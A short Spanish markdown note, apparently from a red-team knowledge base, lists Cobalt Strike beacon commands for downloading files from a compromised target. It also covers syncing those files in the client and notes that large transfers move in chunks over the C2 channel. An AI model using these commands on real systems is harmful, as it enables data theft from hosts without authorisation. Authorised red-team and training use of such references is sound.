---
title: Cobalt Strike — Descargar Archivos
tags: [cobalt-strike, post-ex, download, exfiltration]
---

# Descargar Archivos

## Descargar un fichero desde el objetivo

```
beacon> download C:\Path\To\File.txt
```

## Ver descargas pendientes

```
beacon> downloads
```

## Sincronizar descargas

En el cliente Cobalt Strike: **View → Downloads → Sync Files**

> [!warning] Los archivos grandes se transfieren en chunks a través del canal C2 — ten en cuenta el perfil Malleable y el sleep interval.
